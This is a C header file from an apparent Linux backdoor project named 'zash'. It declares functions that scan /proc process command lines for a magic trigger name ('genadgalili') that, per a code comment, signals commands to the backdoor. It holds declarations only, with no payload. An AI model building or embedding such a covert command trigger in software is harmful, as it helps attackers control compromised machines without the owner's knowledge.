/**
 * @brief Internal header for scanner.c. This module scan for commands.
 * @aouther Z.F
 * @date 22/3/2020
 */

#ifndef ZASH_SCANNER_INTERNAL_H
#define ZASH_SCANNER_INTERNAL_H

/** Headers ***************************************************/
#include <stdbool.h>

#include "scanner.h"


/** Constants *************************************************/
/* The path of the directory contains information about process */
#define SCANNER_PROC_PATH "/proc"
/* The format to use to access the file contains a process command line*/
#define SCANNER_CMD_PATH_FORMAT "/proc/%d/cmdline"
/* The magic command name that tells the backdoor that a process represent a command */
#define SCANNER_REQUIRED_COMMAND "genadgalili"
/* The maximum size of a command line to scan. */
#define SCANNER_MAX_COMMAND_LINE_LENGTH (4096)

/** Structs **************************************************/
/** @brief the context of a scanner object. */
struct SCANNER_context {
    /* the pids already scanned  */
    struct VECTOR_context *scanned_pids;
    /* the data found from scanning processes */
    struct VECTOR_context *data;
};


/** Functions *************************************************/
/**
 * @brief Check if a process was already scanned.
 *
 * @param [in]           pid                    the pid of the process to check.
 *
 * @param [in]           scanned_pids           the pids that was already scanned.
 *
 * @param [out]          is_scanned             true if the pid was already scanned.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status scanner_is_scanned(int pid, struct VECTOR_context *scanned_pids, bool *is_scanned);


/**
 * @brief Mark a process as scanned so it wont be scanned again.
 *
 * @param [in]           pid                    the pid of the process to mark as scanned
 *
 * @param [in,out]       scanned_pids           the pids that was already scanned.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status scanner_mark_as_scanned(int pid, struct VECTOR_context *scanned_pids);


/**
 * @brief Get the command line used for running a process.
 *
 * @param [in]           pid                    the pid of the process to extract it's data.
 *
 * @param [in]           max_command_line       the maximum size in bytes that can be
 *                                              write into command_line parameter.
 *
 * @param [out]          command_line           the command line used to run the process. this
 *                                              parameter has the same syntax as the file
 *                                              /proc/[pid]/cmdline - each parameter will be
 *                                              separated form the next by a null terminator.
 *
 * @param [out]          command_line_len       the length in bytes of the command_line parameter.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status scanner_get_command_line(int pid,
                                          size_t max_command_line,
                                          char *command_line,
                                          size_t *command_line_len);
/**
 * @brief Check if a process has the magic command that mean its data is required by the scanner.
 *
 * @param [in]           command_name           the command used to run the process.
 *
 * @param [out]          is_required            true if the process is required by the scanner.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status scanner_is_required(const char *command_name, bool *is_required);


/**
 * @brief Get a SCANNER_data object contains all required data about a process.
 *
 * @param [in]           pid                    the pid of the process to extract it's data.
 *
 * @param [in]           command_line           the command line used to run the process. this
 *                                              parameter has the same syntax as the file
 *                                              /proc/[pid]/cmdline - each parameter will be
 *                                              separated form the next by a null terminator.
 *
 * @param [in]           command_line_len       the length in bytes of the command_line parameter.
 *
 * @param [out]          data                   the extracted data about the process.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status scanner_extract_data(int pid,
                                      char *command_line,
                                      size_t command_line_len,
                                      struct SCANNER_data **data);


/**
 * @brief Scan for commands from a specific process.
 *
 * @param [in]           context                the scanner to scan me.
 *
 * @param [in]           pid                    the pid of the process to scan from.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status scanner_scan_by_pid(struct SCANNER_context *context, int pid);


/**
 * @brief Scan for commands from a file in /proc directory.
 *
 * @param [in]           file                   the name of the file.
 *
 * @param [in]           context                the scanner to scan me.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status scanner_scan_file(const char *file, struct SCANNER_context *context);


#endif //ZASH_SCANNER_INTERNAL_H
